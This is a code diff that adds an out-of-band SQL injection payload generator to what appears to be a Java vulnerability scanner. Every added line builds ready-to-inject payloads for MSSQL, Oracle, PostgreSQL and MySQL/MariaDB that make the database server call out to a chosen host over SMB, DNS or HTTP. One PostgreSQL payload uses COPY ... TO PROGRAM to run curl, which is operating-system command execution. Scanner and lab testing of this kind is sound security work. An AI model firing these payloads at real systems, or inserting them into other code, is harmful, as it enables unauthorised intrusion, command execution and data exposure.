@@ -1394,4 +1394,43 @@ public class SQLInjectionAnalyzer {
         public List<String> getEvidence() { return evidence; }
         public String getResponseSnippet() { return responseSnippet; }
     }
+
+    /**
+     * Builds out-of-band (OOB) SQL injection payloads targeting the given
+     * callback URL. The URL is expected to be an HTTP listener reachable by
+     * the database server (e.g. an embedded {@link LoopbackCallbackServer}
+     * running on the scanner's loopback for local-lab targets).
+     *
+     * <p>Each generated payload tries a DBMS-specific outbound primitive:
+     * MSSQL {@code xp_dirtree}, Oracle {@code UTL_HTTP.REQUEST}, PostgreSQL
+     * {@code COPY ... TO PROGRAM} (requires superuser), MySQL
+     * {@code LOAD_FILE} via UNC path, and MariaDB
+     * {@code SELECT ... INTO OUTFILE}. The caller should inject each payload
+     * and then poll {@link LoopbackCallbackServer#hits()} to confirm OOB
+     * exfiltration — confirmation requires zero in-band echo, so this works
+     * even against blind-SQLi endpoints.
+     *
+     * <p>Returns an empty list when the callback URL is null/blank so callers
+     * can unconditionally inject the result.
+     */
+    public List<String> buildOobPayloads(String callbackUrl) {
+        List<String> oob = new ArrayList<>();
+        if (callbackUrl == null || callbackUrl.isBlank()) return oob;
+        String url = callbackUrl.replaceAll("/$", "");
+        // host:port form for UNC / DNS-based primitives (strip http://)
+        String hostPort = url.replaceFirst("^https?://", "");
+        // MSSQL — xp_dirtree fires SMB lookup to host\share (DNS+SMB outbound)
+        oob.add("'; EXEC master..xp_dirtree '\\\\\\\\" + hostPort + "\\\\a' --");
+        oob.add("'; EXEC master..xp_fileexist '\\\\\\\\" + hostPort + "\\\\a' --");
+        // Oracle — UTL_HTTP.REQUEST issues an outbound HTTP call
+        oob.add("' || UTL_HTTP.REQUEST('" + url + "/ora') || '");
+        oob.add("' || (SELECT UTL_INADDR.GET_HOST_ADDRESS('" + hostPort + "') FROM dual) || '");
+        // PostgreSQL — COPY ... TO PROGRAM requires superuser; works on many lab installs
+        oob.add("'; COPY (SELECT '') TO PROGRAM 'curl " + url + "/pg' --");
+        // MySQL — LOAD_FILE on UNC path triggers SMB lookup on Windows hosts
+        oob.add("' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\','" + hostPort + "','\\\\anibus')) -- ");
+        // MariaDB / MySQL outfile to UNC
+        oob.add("' UNION SELECT 1 INTO OUTFILE '\\\\\\\\" + hostPort + "\\\\anibus' -- ");
+        return oob;
+    }
 }
